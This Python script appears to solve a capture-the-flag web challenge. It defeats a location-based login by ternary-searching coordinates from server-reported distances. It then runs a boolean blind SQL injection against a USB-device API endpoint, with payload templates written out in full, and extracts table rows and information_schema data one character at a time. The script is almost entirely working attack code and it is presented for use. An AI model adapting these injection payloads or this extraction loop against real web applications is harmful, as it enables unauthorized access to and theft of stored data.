#!/usr/bin/env python3
import requests
import string
import sys


SESSION = requests.Session()
BASE_URL = 'https://miningmind.wutctf.space/'
AUTH_ENDPOINT = BASE_URL + 'api/auth'
USB_ENDPOINT = BASE_URL + 'api/usb'

LAT_BOUNDS = (-90, 90)
LNG_BOUNDS = (-180, 180)
HEAD_QUARTERS = (-45.423975728378025, -157.47046238434746)

FORBIDDEN_CHARS = [
    "'",
    ";",
    "\\",
]


def post_location(coords):
    lat, lng = coords
    return SESSION.post(AUTH_ENDPOINT, json={
        'latitude': lat,
        'longitude': lng,
    }).json()


def get_distance(coords):
    return post_location(coords).get('distance')


def search_coord(bounds, other, prev_dist, pack):
    hi, lo = bounds
    third = (hi - lo) / 3
    left = lo + third
    right  = lo + 2 * third

    left_dist = get_distance(pack(left, other))
    right_dist = get_distance(pack(right, other))

    if left_dist < right_dist:
        hi = right
        coord = left
        dist = left_dist
    else:
        lo = left
        coord = right
        dist = right_dist

    delta = prev_dist - dist
    if delta == 0:
        return coord
    else:
        return search_coord((lo, hi), other, dist, pack)


def search_lat(lng):
    return search_coord(
        LAT_BOUNDS,
        lng,
        0,
        lambda fst, snd: (fst, snd)
    )

def search_lng(lat):
    return search_coord(
        LNG_BOUNDS,
        lat,
        0,
        lambda fst, snd: (snd, fst)
    )

def authenticate():
    post_location(HEAD_QUARTERS)
    if SESSION.cookies.get('session') is None:
        lng = search_lng(0)
        lat = search_lat(lng)
        return post_location((lat, lng)).get('access')


def probe(response):
    print('\n\trequest:')
    print(response.request.headers)
    print(response.request.body)
    print('\n\tresponse:')
    print(response.status_code)
    print(response.headers)
    print(response.text)


def post_usb(manufacturer, product):
    return SESSION.post(USB_ENDPOINT, json={
        'manufacturer_name': manufacturer,
        'product_name': product,
    })


def get_forbidden_chars():
    forbidden_chars = {
        'manufacturer': [],
        'product': [],
    }
    for c in string.printable:
        if post_usb('', c).status_code != 200:
            forbidden_chars['manufacturer'].append(c)
        if post_usb(c, '').status_code != 200:
            forbidden_chars['product'].append(c)
    return forbidden_chars


def count_rows(tbl):
    QUERY_FMT = "'OR {cnt}=(SELECT COUNT(*) FROM {tbl})) tmp #"
    cnt_found = False
    cnt = 0
    while not cnt_found:
        cnt += 1
        cnt_found = post_usb(
            QUERY_FMT.format(cnt=cnt, tbl=tbl),
            ''
        ).json()['supported']
    return cnt


def oracle(c, col, pos, tbl, cond, row):
    QUERY_FMT = "'OR BINARY '{c}'=(SELECT MID({col},{pos},1) FROM {tbl} WHERE {cond} LIMIT {row},1)) tmp #"
    payload = QUERY_FMT.format(c=c, col=col, pos=pos, tbl=tbl, cond=cond, row=row)
    response = post_usb(payload, '')
    try:
        return response.json()['supported']
    except:
        return False

def dump_value(col, tbl, cond, row):
    value = ""
    hit = True
    i = 0
    while hit:
        i += 1
        hit = False
        for c in string.printable:
            hit = oracle(c, col, i, tbl, cond, row)
            if hit:
                print(c, end='')
                sys.stdout.flush()
                value += c
                break
        if not hit:
            break
    print()
    return value


def dump_column(col, tbl, cond):
    values = []
    val = "bogus"
    row = -1
    while len(val) > 0:
        row += 1
        val = dump_value(col, tbl, cond, row)
        values.append(val)
    return values


def main():
    authenticate()

    dump_column('model', 'brains', 'true')

    tables = [
        {
            'name': 'brains',
            'columns': [
                'id',
                'model',
            ],
        },
        {
            'name': 'interfaces',
            'columns': [
                'id',
                'product',
                'manufacturer',
            ],
        },
        # {
        #     'name': 'locations',
        #     'columns': [],
        # }
    ]
    dump_column('data_type', 'information_schema.colums', "table_name='brains' AND column_name='model'")
    # for tbl in tables:
    #     name = tbl['name']
    #     print(name)
    #     for col in tbl['columns']:
    #         print(col)
    #         dump_column('data_type', 'information_schema.colums', "table_name='{}' AND column_name='{}'".format(name, col))
    #         columns = dump_column(col, name, 'true')

if __name__ == '__main__':
    main()
